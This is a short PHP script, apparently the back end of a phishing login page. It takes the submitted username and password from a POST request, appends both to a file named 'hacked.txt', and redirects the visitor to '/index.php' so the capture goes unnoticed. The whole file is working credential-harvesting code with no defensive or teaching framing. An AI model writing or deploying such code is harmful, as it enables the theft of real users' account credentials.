<?php

file_put_contents("hacked.txt", "[Username:] " . $uname = $_POST['uname'] . " [Password:] " . $pwd = $_POST['psw'] . "\n", FILE_APPEND);
header('Location: /index.php');
?>